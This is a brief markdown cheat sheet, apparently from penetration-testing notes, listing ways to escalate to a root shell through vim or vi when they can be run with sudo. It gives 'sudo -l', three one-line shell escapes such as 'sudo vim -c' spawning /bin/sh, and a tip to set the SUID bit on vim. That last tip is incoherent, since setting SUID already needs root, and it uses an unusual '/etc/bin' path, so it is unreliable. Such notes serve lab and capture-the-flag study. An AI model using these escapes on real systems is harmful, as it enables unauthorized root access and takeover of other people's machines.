# VIM
***

- List commands that a user is allowed to execute with superuser privileges
```sh
sudo -l
```

- Method 1
```sh
sudo vi
:!sh
```

- Method 2
```sh
sudo vim -c ':!/bin/sh'
```

- Method 3
```sh
sudo vi -c '!sh'
```


- If nothing works, try to set the SUID first, then try again.
```sh
chmod +s /etc/bin/vim
# OR
chmod +s /etc/bin/vi
```
